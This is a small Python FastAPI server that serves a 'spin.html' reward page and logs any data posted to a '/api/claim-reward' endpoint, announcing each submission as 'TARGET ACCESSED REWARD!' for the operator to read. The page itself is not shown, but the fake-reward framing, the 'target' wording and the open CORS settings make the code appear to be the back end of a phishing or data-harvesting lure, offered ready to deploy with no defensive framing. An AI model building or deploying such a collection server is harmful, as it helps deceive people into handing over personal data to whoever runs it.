from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import datetime

app = FastAPI()

# Enable CORS so your HTML can talk to this API
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/", response_class=HTMLResponse)
async def get_index():
    # Place your entire HTML code inside the return
    with open("spin.html", "r", encoding="utf-8") as f:
        return f.read()

@app.post("/api/claim-reward")
async def claim_reward(info: dict):
    # This is what you will see in Render Logs
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print("\n" + "="*30)
    print(f"🚨 TARGET ACCESSED REWARD! 🚨")
    print(f"Time: {timestamp}")
    print(f"Data Received: {info}")
    print("="*30 + "\n")
    return {"status": "success", "message": "Log recorded"}